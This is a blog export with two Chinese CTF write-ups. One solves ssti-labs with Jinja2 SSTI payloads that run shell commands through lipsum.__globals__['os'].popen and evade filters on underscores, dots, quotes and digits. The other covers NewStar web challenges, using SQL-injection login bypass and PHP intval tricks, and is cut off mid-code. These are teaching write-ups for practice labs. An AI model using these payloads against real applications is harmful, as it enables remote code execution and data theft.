[{"title":"SSTI1:ssti-labs通关wp","url":"/2025/09/15/SSTI1-ssti-labs%E9%80%9A%E5%85%B3wp/","content":"写在前面这里直接用的nssctf在线平台https://www.nssctf.cn/problem/13\n以下题目我用简洁的payload 绕过&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;\n其中lipsum为 flask框架 内置函数 通用\n前置知识获取键值或下标dict[&#x27;__builtins__&#x27;] dict.__getitem__(&#x27;__builtins__&#x27;) dict.pop(&#x27;__builtins__&#x27;) dict.get(&#x27;__builtins__&#x27;) dict.setdefault(&#x27;__builtins__&#x27;) list[0] list.__getitem__(0) list.pop(0)\n\n获取属性().__class__()[&quot;__class__&quot;]()|attr(&quot;__class__&quot;)().__getattribute__(&quot;__class__&quot;)\n\nbuiltins在 Python中，builtins 模块是一个特殊的模块，它包含了所有 Python 内置的函数、异常、常量和其他内置对象。\nbuiltins 模块提供了对 Python 内置标识符的直接访问。这些内置标识符包括常用的函数（如 print()、len()）、数据类型（如 int()、str()）、异常类（如 ValueError），以及一些常量（如 True、False）。这些对象在 Python 解释器启动时就会自动加载，因此在任何地方都可以直接使用它们，而无需显式导入。\n例如,以下两种调用方式本质上是一致的\n# 直接调用print(len(&#x27;abc&#x27;))  # 输出: 3# 使用 builtins 模块import builtinsprint(builtins.len(&#x27;abc&#x27;))  # 输出: 3\n\n内省机制Python 的内省（Introspection）是一种动态获取对象信息的能力。通过内省，我们可以查看对象的类型，查看它的属性和方法，以及它继承的类等等。\n以下是 Python 内省的一些主要工具和技术:\ndir()&gt;&gt;&gt; dir(&quot;Hello World&quot;)[&#x27;__add__&#x27;, &#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__getnewargs__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__mod__&#x27;, &#x27;__mul__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__rmod__&#x27;, &#x27;__rmul__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;capitalize&#x27;, &#x27;casefold&#x27;, &#x27;center&#x27;, &#x27;count&#x27;, &#x27;encode&#x27;, &#x27;endswith&#x27;, &#x27;expandtabs&#x27;, &#x27;find&#x27;, &#x27;format&#x27;, &#x27;format_map&#x27;, &#x27;index&#x27;, &#x27;isalnum&#x27;, &#x27;isalpha&#x27;, &#x27;isdecimal&#x27;, &#x27;isdigit&#x27;, &#x27;isidentifier&#x27;, &#x27;islower&#x27;, &#x27;isnumeric&#x27;, &#x27;isprintable&#x27;, &#x27;isspace&#x27;, &#x27;istitle&#x27;, &#x27;isupper&#x27;, &#x27;join&#x27;, &#x27;ljust&#x27;, &#x27;lower&#x27;, &#x27;lstrip&#x27;, &#x27;maketrans&#x27;, &#x27;partition&#x27;, &#x27;replace&#x27;, &#x27;rfind&#x27;, &#x27;rindex&#x27;, &#x27;rjust&#x27;, &#x27;rpartition&#x27;, &#x27;rsplit&#x27;, &#x27;rstrip&#x27;, &#x27;split&#x27;, &#x27;splitlines&#x27;, &#x27;startswith&#x27;, &#x27;strip&#x27;, &#x27;swapcase&#x27;, &#x27;title&#x27;, &#x27;translate&#x27;, &#x27;upper&#x27;, &#x27;zfill&#x27;]\n\ngetattr(), setattr(), hasattr(), delattr()这些内置函数用于获取、设置、检查和删除对象的属性\n简单例子:\nclass MyClass:  def __init__(self):    self.my_attribute = 123my_instance = MyClass()&gt;&gt;&gt; getattr(my_instance, &#x27;my_attribute&#x27;)123&gt;&gt;&gt; setattr(my_instance, &#x27;my_attribute&#x27;, 456)&gt;&gt;&gt; print(my_instance.my_attribute)456&gt;&gt;&gt; hasattr(my_instance, &#x27;my_attribute&#x27;)True&gt;&gt;&gt; delattr(my_instance, &#x27;my_attribute&#x27;)&gt;&gt;&gt; hasattr(my_instance, &#x27;my_attribute&#x27;)False\n\nhelp()这个函数提供了关于一个对象（如类、方法、模块等）的详细信息。\n例如:\n通过 help 函数可以找到这个类所有的方法定义以及属性, 可以看到其中有很多以 __ 开头的函数和属性, 这些函数和属性被称为魔术方法&#x2F;属性.\nglobals()会以字典类型返回当前位置的全部全局变量\n下面是菜鸟教程的一个例子\n&gt;&gt;&gt;a=&#x27;runoob&#x27;&gt;&gt;&gt; print(globals()) # globals 函数返回一个全局变量的字典，包括所有导入的变量。&#123;&#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;a&#x27;: &#x27;runoob&#x27;, &#x27;__package__&#x27;: None&#125;\n\nvars()返回对象object的属性和属性值的字典对象\n&gt;&gt;&gt;print(vars())&#123;&#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None&#125;&gt;&gt;&gt; class Runoob:...     a = 1... &gt;&gt;&gt; print(vars(Runoob))&#123;&#x27;a&#x27;: 1, &#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;&gt;&gt;&gt; runoob = Runoob()&gt;&gt;&gt; print(vars(runoob))&#123;&#125;\n\npython 魔术方法&#x2F;属性__builtins__一个 builtins 模块的一个引用，其中包含 Python 的内置名称。这个模块自动在所有模块的全局命名空间中导入。当然我们也可以使用 import builtins 来导入\n它包含许多基本函数（如 print、len 等）和基本类（如 object、int、list 等）。这就是可以在 Python 脚本中直接使用 print、len 等函数，而无需导入任何模块的原因。\n我们可以使用 dir() 查看当前模块的属性列表. 其中就可以看到 __builtins__\n&gt;&gt;&gt; dir()[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;subprocess&#x27;]\n\n我们可以使用 dir(__builtins__) 来查看 __builtins__ 中包含的函数.\n&gt;&gt;&gt; dir(__builtins__)[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BaseExceptionGroup&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, &#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EncodingWarning&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;ExceptionGroup&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, &#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;_&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;abs&#x27;, &#x27;aiter&#x27;, &#x27;all&#x27;, &#x27;anext&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, &#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;]\n\n__builtins__ 仅仅是 builtins 模块的引用，实际上是以 dict 的形式实现的.\n__import____import__接收字符串作为参数，导入该字符串名称的模块。\n如import sys相当于__import__(&#39;sys&#39;)，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤,比如:\n__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;ca&#x27;+&#x27;lc&#x27;)\n\n__class__用于获取对象的类,例如:\n&#x27;&#x27;.__class__ &quot;&quot;&quot;&lt;class &#x27;str&#x27;&gt;&quot;&quot;&quot;\n\n__bases__列出当前对象的基类\nprint(&#x27;&#x27;.__class__.__bases__)&quot;&quot;&quot;(&lt;class &#x27;object&#x27;&gt;,)&quot;&quot;&quot;\n\n__mro__用于展示类的继承关系，类似于 bases:\nprint(&#x27;&#x27;.__class__.__mro__)&quot;&quot;&quot;(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)&quot;&quot;&quot;\n\n__globals____globals__是一个特殊属性，能够以 dict 的形式返回函数（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。\n注意，某些内置函数并没有 __globals__属性，因为这些函数并不是 Python 代码定义的，而是用 C 语言或其他底层语言实现的，例如 os.system 函数\nclass TestClass:    def test(self):        a = 1        b = 2        return a,bprint(TestClass.test.__globals__)def test():    a = 1    b = 2    return a,bprint(test.__globals__)import osprint(os.system.__globals__)&quot;&quot;&quot;&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x0000000000EE3A50&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;d:\\\\Problems\\\\moe\\\\week5\\\\pyjail4.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;TestClass&#x27;: &lt;class &#x27;__main__.TestClass&#x27;&gt;&#125;&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x0000000000EE3A50&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;d:\\\\Problems\\\\moe\\\\week5\\\\pyjail4.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;TestClass&#x27;: &lt;class &#x27;__main__.TestClass&#x27;&gt;, &#x27;test&#x27;: &lt;function test at 0x0000000000E904A0&gt;&#125;Traceback (most recent call last):  File &quot;d:\\Problems\\moe\\week5\\pyjail4.py&quot;, line 15, in &lt;module&gt;    print(os.system.__globals__)          ^^^^^^^^^^^^^^^^^^^^^AttributeError: &#x27;builtin_function_or_method&#x27; object has no attribute &#x27;__globals__&#x27;&quot;&quot;&quot;\n\nsubclasses可以获取到某个类所有子类\nimport requestsclass Father(requests.Session):    def test():        passclass Son(Father):    def test():        passprint(Father.__subclasses__())print(requests.Session.__subclasses__())&quot;&quot;&quot;[&lt;class &#x27;__main__.Son&#x27;&gt;][&lt;class &#x27;__main__.Father&#x27;&gt;]&quot;&quot;&quot;\n\n__dict__以字典形式存储对象的可写属性。每个对象（包括类、实例、模块等）都有自己的 __dict__ 属性，通常用于保存该对象的命名空间，即与该对象相关的所有属性和值。\n比如当我们将 flag 字符声明在 __main__ 模块时，就可以在 __main__ 模块的 __dict__ 属性中找到，与 globals() 函数的返回结果一致。\nimport syssys.modules[&#x27;__main__&#x27;].__dict__ == globals()# True\n\n其他__del__：一个类的析构函数，当一个对象被销毁时，它会被自动调用。__str__ 和 __repr__：这两个方法用于定义对象的字符串表示形式。__str__ 是在使用 str() 函数或 print 语句时被调用的，而 __repr__ 是在使用 repr() 函数时被调用的。如果 __str__ 没有被定义，那么在需要的时候会使用 __repr__。__eq__, __ne__, __lt__, __gt__, __le__, __ge__：这些方法用于定义对象的比较操作。__add__, __sub__, __mul__, __div__, __mod__, __pow__：这些方法用于定义数学运算符的行为。__getitem__, __setitem__, __delitem__：这些方法用于支持类似字典的索引和切片操作。__iter__ 和 __next__：这两个方法用于定义一个迭代器。__call__：这个方法使得一个实例可以像函数一样被调用。__getattr__, __setattr__, __delattr__：这些方法用于控制属性访问。\n\n关卡Level 1 no waf&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n\nSSTILAB&#123;enjoy_flask_ssti&#125;\n\nLevel 2&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。&#123;&#123;&#125;&#125;用于将表达式打印到模板输出&#123;##&#125;表示未包含在模板输出中的注释\\##可以有和&#123;%%&#125;相同的效果&#123;&#123;&#125;&#125; 等价于 &#123;%print%&#125;\n\n&#123;%print lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()%&#125;\n\n\nSSTILAB&#123;enjoy_flask_ssti&#125;\n\nLevel 3 no waf and blind上一题的payload打不通\n\n正确但是没有flag回显,尝试写静态文件\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo &quot;test&quot; &gt;/app/static/1.txt&#x27;).read()&#125;&#125;\n\n\n成功写入,然后直接读flag即可\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo `cat /app/flag` &gt;/app/static/2.txt&#x27;).read()&#125;&#125;\n\n\nSSTILAB&#123;enjoy_flask_ssti&#125;\n\nLevel 4把中括号过滤了,但是由于__globals__返回的是一个字典,可以通过.get方式得到值\n回顾:\ndict[&#x27;__builtins__&#x27;] dict.__getitem__(&#x27;__builtins__&#x27;) dict.pop(&#x27;__builtins__&#x27;) dict.get(&#x27;__builtins__&#x27;) dict.setdefault(&#x27;__builtins__&#x27;) list[0] list.__getitem__(0) list.pop(0)\n\n&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;echo `cat /app/flag` &gt;/app/static/2.txt&#x27;).read()&#125;&#125;\n\n\nLevel 5过滤引号,可以替换为 request.args.参数名（get方式）\n&#123;&#123;lipsum.__globals__[request.args.x1].popen(request.args.x2).read()&#125;&#125;\n\n\nLevel 6过滤下划线,可以编码绕过,比如unicode,hex编码\n&#123;&#123;lipsum[&#x27;\\x5f\\x5fglobals\\x5f\\x5f&#x27;][&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n\nLevel 7过滤点号,用[]代替.\n其他方法参考获取属性的四种方法\n&#123;&#123;lipsum[&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;\n\n\nLevel 8+号连接字符串即可\n&#123;&#123;lipsum[&#x27;__glob&#x27;+&#x27;als__&#x27;][&#x27;os&#x27;][&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls&#x27;).read()&#125;&#125;\n\n\nLevel 9刚才用的payload压根没有数字\n&#123;&#123;lipsum[&#x27;__glob&#x27;+&#x27;als__&#x27;][&#x27;os&#x27;][&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n\nLevel 10 set config &#x3D; None这题的目的是得到config的内容,直接没有回显\n通过current_app拿到config\ncurrent_app 是Flask中的一个全局变量，代表当前运行的Flask应用实例\n&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;\n\n\nLevel 11ban 了 . []如何取属性 ？\n通过 |attr()\n如何取键值 ？\n通过 __getitem__(&#39;key&#39;)\n然后用 &#123;%set %&#125;和|join过滤器拼接\n过滤器是通过|进行使用的，例如&#123;&#123; name|length &#125;&#125;,将返回name的长度，过滤器相当于是一个函数，把当前的的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再渲染到模板页面中\n从最基本的payload出发:\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;\n\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;a.构造__globals__&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;b.构造os&#123;%set b=dict(o=a,s=a)|join%&#125;c.构造popen&#123;%set c=dict(po=a,pen=a)|join%&#125;cmd.构造ls&#123;%set cmd=dict(l=a,s=a)|join%&#125;d.构造read&#123;%set d=dict(re=a.ad=a)|join%&#125;e.构造__getitem__&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; f.构造__builtins__&#123;%set f=dict(__buil=a,tins__=a)%&#125;g.构造 chr 字符&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\nb=dict(o=a,s=a)|join何意味?\n创建一个字典，包含两个键值对：\n\n键:o,值:a\n\n键:s,值:a\n\n|join:过滤器,将字典的键拼接起来\n\n\n就是:\n&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set cmd=dict(l=a,s=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; &#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n\nls还不够,最后还是要拼接cat /app/flag这个命令\n我们先要得到chr函数,ascii表中32是空格,47为斜杠\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;a.构造__globals__&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;b.构造os&#123;%set b=dict(o=a,s=a)|join%&#125;c.构造popen&#123;%set c=dict(po=a,pen=a)|join%&#125;cmd.构造ls&#123;%set cmd=dict(l=a,s=a)|join%&#125;d.构造read&#123;%set d=dict(re=a,ad=a)|join%&#125;e.构造__getitem__&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; f.构造__builtins__&#123;%set f=dict(__buil=a,tins__=a)|join%&#125;ch.构造 chr 字符&#123;%set ch=dict(ch=a,r=a)|join%&#125;chh.构造 chr 函数&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;\n\ncode=&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=dict(__ge=a,titem__=a)|join%&#125; &#123;%set f=dict(__buil=a,tins__=a)|join%&#125;&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(32),chh(47),dict(ap=a,p=a)|join,chh(47),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;#这里的chh就是chr这个函数\n\n\nLevel 12相比上一题,过滤了下划线和数字\n\n取下划线,测试\n&#123;&#123;()|select|string|list&#125;&#125;\n\n\n\n\n在第24个字符取到下划线,通过pop(24)得到_\n&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;&#123;()|select|string|list|attr(p)(24)&#125;&#125;\n\n但是这里禁止了数字0-9,可以通过过滤器 | length 或者| count取到数字24\n先生成24个字符aaaaaaaaaaaaaaaaaaaaaaaa\n取下划线\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;&#123;()|select|string|list|attr(p)(numa)&#125;&#125;\n\n\n延用上关的payload进行修改\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;%set xhx=()|select|string|list|attr(p)(numa)%&#125;&#123;%set a=(xhx,xhx,dict(glo=a,bals=a)|join,xhx,xhx)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=(xhx,xhx,dict(ge=a,titem=a)|join,xhx,xhx)|join%&#125;&#123;%set f=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join%&#125;&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;&#123;%set numb=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numc=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(numb),chh(numc),dict(ap=a,p=a)|join,chh(numc),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n\n\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;%set xhx=()|select|string|list|attr(p)(numa)%&#125;#得到下划线_&#123;%set a=(xhx,xhx,dict(glo=a,bals=a)|join,xhx,xhx)|join%&#125;#得到__globals__&#123;%set b=dict(o=a,s=a)|join%&#125;#得到os&#123;%set c=dict(po=a,pen=a)|join%&#125;得到popen&#123;%set d=dict(re=a,ad=a)|join%&#125;#得到read&#123;%set e=(xhx,xhx,dict(ge=a,titem=a)|join,xhx,xhx)|join%&#125;#得到__getitem__&#123;%set f=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join%&#125;#得到__builtins__&#123;%set ch=dict(ch=a,r=a)|join%&#125;得到chr字符&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;得到chr函数&#123;%set numb=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;分别取得空格和/&#123;%set numc=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(numb),chh(numc),dict(ap=a,p=a)|join,chh(numc),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n注意一下 不能单独\n&#123;%set a=dict(glob=a,als=a)|join%&#125;&#123;%set ac=(xhx,xhx,a,xhx,xhx)|join%&#125; //这是失败的\n\n\nLevel 13上一关payload还能打\n&#123;%set numa=dict(aaaaaaaaaaaaaaaaaaaaaaaa=b)|join|count%&#125;&#123;%set p=dict(po=a,p=a)|join%&#125;&#123;%set xhx=()|select|string|list|attr(p)(numa)%&#125;&#123;%set a=(xhx,xhx,dict(glo=a,bals=a)|join,xhx,xhx)|join%&#125;&#123;%set b=dict(o=a,s=a)|join%&#125;&#123;%set c=dict(po=a,pen=a)|join%&#125;&#123;%set d=dict(re=a,ad=a)|join%&#125;&#123;%set e=(xhx,xhx,dict(ge=a,titem=a)|join,xhx,xhx)|join%&#125;&#123;%set f=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join%&#125;&#123;%set ch=dict(ch=a,r=a)|join%&#125;&#123;%set chh=lipsum|attr(a)|attr(e)(f)|attr(e)(ch)%&#125;&#123;%set numb=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numc=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set cmd=(dict(ca=a,t=a)|join,chh(numb),chh(numc),dict(ap=a,p=a)|join,chh(numc),dict(fl=a,ag=a)|join)|join%&#125;&#123;&#123;lipsum|attr(a)|attr(e)(b)|attr(c)(cmd)|attr(d)()&#125;&#125;\n\n\n","categories":["python,ssti"],"tags":["ssti,wp"]},{"title":"newstar公开赛道","url":"/2025/10/03/newstar%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93/","content":"webmulti-headach3由提示访问&#x2F;robots.txt,得到hidden.php,bp重放得到flag\n\nflag&#123;ebdf1c75-5f68-4cae-9795-e5457bb31754&#125;\n\nstrange_login由提示得知万能密码登录,并提示要由管理员登陆\n账密都填就好了，一开始以为用户名要是admin\n1&#x27; and 1=1--+\n\n\nflag&#123;e1668fbe-b722-4f1a-806a-4ca9146f98a6&#125;\n\n宇宙的中心是phpF12被禁了，用view-source:或者抓包，得到路由s3kret.php\n&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;if(isset($_POST[&#x27;newstar2025&#x27;]))&#123;    $answer = $_POST[&#x27;newstar2025&#x27;];    if(intval($answer)!=47&amp;&amp;intval($answer,0)==47)&#123;        echo $flag;    &#125;else&#123;        echo &quot;你还未参透奥秘&quot;;    &#125;&#125;\n\n使用16进制绕过，47的十六进制是2F\nPOST:newstar=0x2f\n\n\nflag&#123;f3453dbd-ef9a-47dc-b889-157d29b17583&#125;\n\n我真得控制你了先禁用js,根据js代码，删除,点击按钮\n进来一个登录界面，bp爆，得到\n\n账号：admin,密码：111111\n&lt;?phperror_reporting(0);function generate_dynamic_flag($secret) &#123;    return getenv(&quot;ICQ_FLAG&quot;) ?: &#x27;default_flag&#x27;;&#125;if (isset($_GET[&#x27;newstar&#x27;])) &#123;    $input = $_GET[&#x27;newstar&#x27;];        if (is_array($input)) &#123;        die(&quot;恭喜掌握新姿势&quot;);    &#125;        if (preg_match(&#x27;/[^\\d*\\/~()\\s]/&#x27;, $input)) &#123;        die(&quot;老套路了，行不行啊&quot;);    &#125;        if (preg_match(&#x27;/^[\\d\\s]+$/&#x27;, $input)) &#123;        die(&quot;请输入有效的表达式&quot;);    &#125;        $test = 0;    try &#123;        @eval(&quot;\\$test = $input;&quot;);    &#125; catch (Error 